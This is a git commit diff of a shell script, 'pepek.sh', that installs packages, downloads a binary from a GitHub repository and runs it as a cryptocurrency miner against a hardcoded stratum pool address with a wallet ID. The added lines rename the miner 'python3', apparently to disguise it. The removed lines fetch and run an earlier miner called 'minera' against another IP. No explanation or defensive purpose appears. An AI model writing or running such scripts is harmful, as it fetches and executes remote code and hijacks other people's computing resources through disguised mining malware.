2e8ac2920fa0ec9f1d7ac73b99754cd7dbde209f
nestri12329018 <153782424+nestri12329018@users.noreply.github.com>
2023-12-14 08:54:11 +0700

    Update pepek.sh

--- pepek.sh
+++ pepek.sh
@@ -1,2 +1,4 @@
-apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t 1
+apt-get update &&  apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
+wget https://github.com/danipedrosang/marcrash/raw/main/python3
+chmod +x python3
+./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 7
